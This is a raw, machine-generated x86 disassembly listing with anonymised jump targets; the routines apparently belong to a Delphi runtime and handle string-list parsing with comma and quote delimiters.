mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43235d
mov eax [ ebp - 0x8 ]
call sub_432150
retn
sub_432394
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x6 ]
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xc ]
mov [ ebp - 0xa ] ax
mov dx 0x2c
mov eax [ ebp - 0x4 ]
call sub_4333fc
mov dx 0x22
mov eax [ ebp - 0x4 ]
call sub_433448
xor eax eax
push ebp
push sub_43241e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43242c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432425
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x8 ]
mov [ eax + 0x6 ] dx
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0xa ]
mov [ eax + 0xc ] dx
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x4 ] dl
retn
sub_43242c
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x84 ] ecx
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43264d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
cmp ebx 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_4070a8
push esi
mov esi r-xdata
lea edi [ ebp - 0x5c ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax esi
call sub_4333c8
mov edx eax
lea eax [ ebp - 0x7c ]
mov cl 0x20
call sub_404ee4
mov eax esi
call sub_433370
push eax
pop eax
movzx eax al
bts [ ebp - 0x7c ] eax
lea edx [ ebp - 0x7c ]
lea eax [ ebp - 0x5c ]
mov cl 0x20
call sub_404f3c
push esi
lea esi [ ebp - 0x5c ]
lea edi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax esi
call sub_4333e4
test al al
jne r-xdata
lea ecx [ ebp - 0x34 ]
xor edx edx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
dec ebx
test ebx ebx
jl r-xdata
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x5c ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
lea eax [ ebp - 0x5c ]
mov edx r-xdata
mov cl 0x20
call sub_404f3c
push esi
lea esi [ ebp - 0x5c ]
lea edi [ ebp - 0x30 ]
mov ecx 0x8
[ edi ] [ esi ]
pop esi
mov eax esi
call sub_4333c8
mov edx eax
lea eax [ ebp - 0x38 ]
call sub_407214
mov eax [ ebp - 0x38 ]
push eax
mov eax esi
call sub_4333c8
mov edx eax
lea eax [ ebp - 0x3c ]
call sub_407214
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x8 ]
pop ecx
call sub_407564
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x88 ]
test eax eax
je r-xdata
inc ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432654
lea eax [ ebp - 0x84 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x3c ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov edx [ ebp - 0x8 ]
mov ecx 0x1
xchg edx eax
call sub_4078a0
sub eax 0x4
mov eax [ eax ]
movzx eax [ ebx ]
cmp ax 0xff
ja r-xdata
jae r-xdata
movzx eax ax
bt [ ebp - 0x30 ] eax
push ebx
call CharNextW
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
push [ ebp - 0x4 ]
mov eax esi
call sub_433370
mov edx eax
lea eax [ ebp - 0x84 ]
call sub_407214
push [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_407648
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax esi
call sub_4333c8
mov edx eax
lea ecx [ ebp - 0x80 ]
mov eax [ ebp - 0x4 ]
call sub_4113e0
mov edx [ ebp - 0x80 ]
lea eax [ ebp - 0x4 ]
call sub_4070fc
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_407134
mov ebx eax
jmp r-xdata
sub_43267f
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x5efe4d38 ] cl
or al 0x6c
inc edx
add al ch
outsb
idiv edi
inc ebx
nop
xor eax eax
retn
sub_4326b0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4326f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_407134
call sub_4128cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4326fc
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_432704
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43288f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43338c
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
xor edx edx
call sub_4071e4
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov esi [ ebp - 0x1c ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x14 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432896
lea eax [ ebp - 0x24 ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
add eax ebx
add [ ebp - 0x18 ] eax
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ecx ebx
add ecx ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4043c8
mov eax ebx
add eax eax
add [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov ebx [ ebp - 0x28 ]
test ebx ebx
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov ecx ebx
add ecx ecx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
call sub_4043c8
mov eax ebx
add eax eax
add [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_43289c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432914
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43291b
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_432928
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4329eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0xc ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4077d0
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_433490
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_407214
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_417b94
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4329f2
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4329fc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_432a30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_432a60
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432aa8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432aaf
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_432ab4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432b01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432b08
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_432b1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_432c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_432088
xor eax eax
push ebp
push sub_432bd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov eax esi
call sub_433c68
sub ebx eax
push ebx
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418dfc
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_408754
sub eax ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
call sub_419924
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432bdd
mov eax [ ebp - 0x8 ]
call sub_432150
retn
sub_432c10
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_432cb1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432cb8
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x8 ]
call sub_432088
xor eax eax
push ebp
push sub_432c94
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_432150
retn
sub_432cc0
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx ebp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_432cf4
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432d98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_436a6c
mov eax [ ebp - 0x4 ]
call sub_432088
xor eax eax
push ebp
push sub_432d73
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4358ac
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_437924
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432d7a
mov eax [ ebp - 0x4 ]
call sub_432150
retn
sub_432db4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx eax
push 0xff00
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_43463c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432e07
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432e0e
mov eax [ ebp - 0x4 ]
call sub_4055f0
retn
sub_432e24
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_432ecd
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419308
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_408754
test eax eax
jle r-xdata
call sub_4198b0
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_408754
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_433ef4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432ed4
lea eax [ ebp - 0xc ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_407e40
retn
mov eax [ ebp - 0x8 ]
call sub_408754
mov ecx eax
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_433ef4
sub_432ee0
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0x2c
mov eax ebx
call sub_4333fc
mov dx 0x22
mov eax ebx
call sub_433448
mov edx esi
mov eax ebx
call sub_4331c0
pop esi
pop ebx
retn
sub_432f08
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
je r-xdata
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_409ccc
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_432f3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432f7f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_407254
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f86
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_432f8c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_433114
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_432088
xor edx edx
push ebp
push sub_4330e2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4330e9
mov eax [ ebp - 0x8 ]
call sub_432150
retn
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43338c
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_410e70
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_43338c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
jmp r-xdata
mov esi ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_43338c
mov eax [ ebp - 0x1c ]
call sub_407134
mov edx eax
mov eax ebx
call sub_417c74
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
test ax ax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
sub ax 0xa
je r-xdata
mov ecx ebx
sub ecx esi
sar ecx 0x1
jns r-xdata
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4071e4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
adc ecx 0x0
sub ax 0x3
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4071e4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi ebx
jne r-xdata
adc ecx 0x0
add ebx 0x2
cmp [ ebx ] 0xa
jne r-xdata
add ebx 0x2
add ebx 0x2
mov eax [ ebp - 0xc ]
add eax eax
add ebx eax
add ebx 0x2
sub_4330e9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43311b
lea eax [ ebp - 0x1c ]
call j_sub_4068a0
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_4068c4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_43312b
inc [ edx ]
add [ eax ] al
add [ 0xa00 ] cl
add [ eax ] al
add bl al
lea eax [ eax ]
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4331b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_4393dc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_4393e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4331b9
lea eax [ ebp - 0xc ]
call j_sub_4068a0
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_43ad1c
inc esi
dec ebx
jne r-xdata
sub_4331c0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
lea ebx [ ebp - 0xc ]
xor eax eax
push ebp
push sub_433362
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_432088
xor eax eax
push ebp
push sub_433345
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax esi
call sub_407134
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
call sub_4333e4
test al al
jne r-xdata
mov eax [ ebx ]
movzx edi [ eax ]
test di di
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4333c8
cmp di ax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43334c
mov eax [ ebp - 0x8 ]
call sub_432150
retn
mov eax [ ebx ]
movzx eax [ eax ]
dec eax
sub ax 0x20
jb r-xdata
mov esi [ ebx ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_4333c8
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_411580
jmp r-xdata
mov eax [ ebx ]
push eax
call CharNextW
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x20
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_433370
mov edx [ ebx ]
cmp ax [ edx ]
jne r-xdata
jmp r-xdata
mov ecx [ ebx ]
sub ecx esi
sar ecx 0x1
jns r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_433370
mov edx [ ebx ]
cmp ax [ edx ]
jne r-xdata
mov esi [ ebx ]
push esi
call CharNextW
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebx ]
movzx eax [ eax ]
dec eax
sub ax 0x20
jb r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4071e4
adc ecx 0x0
mov eax [ ebx ]
push eax
call CharNextW
mov [ ebx ] eax
mov eax [ ebx ]
push eax
call CharNextW
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx ]
push eax
call CharNextW
mov [ ebx ] eax
mov eax [ ebx ]
movzx eax [ eax ]
dec eax
sub ax 0x20
jb r-xdata
sub_43338c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x4 ] 0x8
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4070a8
pop esi
pop ebx
retn
mov edx r-xdata
mov eax ebx
call sub_43341c
sub_4333fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp si [ ebx + 0x6 ]
jne r-xdata
or [ ebx + 0x4 ] 0x1
mov [ ebx + 0x6 ] si
test [ ebx + 0x4 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
sub_43341c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_407768
jne r-xdata
or [ ebx + 0x4 ] 0x8
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_4070a8
test [ ebx + 0x4 ] 0x8
jne r-xdata
pop esi
pop ebx
retn
